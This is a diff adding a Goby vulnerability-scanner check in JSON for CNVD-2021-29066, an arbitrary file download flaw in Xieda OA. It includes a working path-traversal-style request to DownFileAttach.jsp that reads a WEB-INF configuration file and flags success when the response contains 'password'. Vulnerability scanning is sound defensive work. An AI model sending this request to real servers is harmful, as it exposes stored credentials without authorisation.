@@ -1,0 +1,59 @@
+{
+      "Name": "Xieda OA Filedownload CNVD-2021-29066",
+      "Level": "1",
+      "Tags": [
+            "filedownload"
+      ],
+      "GobyQuery": "body=\"协达软件\"",
+      "Description": "Xieda OA",
+      "Product": "Xieda OA",
+      "Homepage": "http://www.ahctop.cn/",
+      "Author": "",
+      "Impact": "An arbitrary file download vulnerability exists in Xieda OA of Anhui Xieda Software Technology Co., Ltd., which can be exploited by attackers to obtain sensitive information.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-29066"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/interface/DownFileAttach.jsp?filepath=/WEB-INF/classes/YxrConnectText.txt",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "password",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
